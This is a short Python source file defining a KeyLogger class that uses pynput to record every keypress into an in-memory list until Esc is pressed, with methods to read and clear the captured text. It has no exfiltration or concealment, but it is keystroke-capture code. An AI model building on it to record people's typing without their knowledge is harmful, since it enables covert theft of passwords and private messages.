from pynput import keyboard

class KeyLogger:
    def __init__(self):
        self.key_list = []
        self.listener = None
        self.active = False

    def on_press(self, key):
        if self.active:
            try:
                self.key_list.append(key.char)
            except AttributeError:
                self.key_list.append(f"[{key.name}]")

    def on_release(self, key):
        if key == keyboard.Key.esc:
            self.stop()
            return False

    def start(self):
        self.active = True
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()

    def stop(self):
        self.active = False
        if self.listener:
            self.listener.stop()
            self.listener.join()

    def get_keys(self):
        return ''.join(self.key_list)

    def clear_keys(self):
        self.key_list = []
